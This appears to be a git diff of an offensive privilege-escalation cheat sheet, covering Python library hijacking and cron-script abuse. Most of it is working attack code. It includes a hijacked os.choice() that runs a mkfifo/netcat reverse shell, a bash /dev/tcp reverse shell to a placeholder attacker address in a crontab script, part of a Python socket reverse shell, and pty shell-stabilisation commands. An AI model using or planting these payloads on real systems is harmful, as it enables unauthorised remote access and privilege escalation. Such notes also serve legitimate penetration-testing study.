@@ -1,4 +1,6 @@
-- Edit python library base64
+## Python Library Hijack
+
+- base64
 
 ````python
 #!/usr/bin/python3  
@@ -13,6 +15,16 @@ dup2(s.fileno(),2)
 run(["/bin/bash","-i"])
 ````
 
+- OS
+
+```python
+import os
+
+def choice(a):
+
+	os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_ATTCK PORT>/tmp/f")
+```
+
 - Edit an script running in a crontab:
 
 ```bash
@@ -20,3 +32,8 @@ bash -i >& /dev/tcp/IP_ATTCK/PORT 0>&1
 ```
 
 
+- How to stabilise a shell:
+````shell
+python -c "import pty; pty.spawn('/bin/bash')" 
+python3 -c "import pty; pty.spawn('/bin/bash')" 
+````
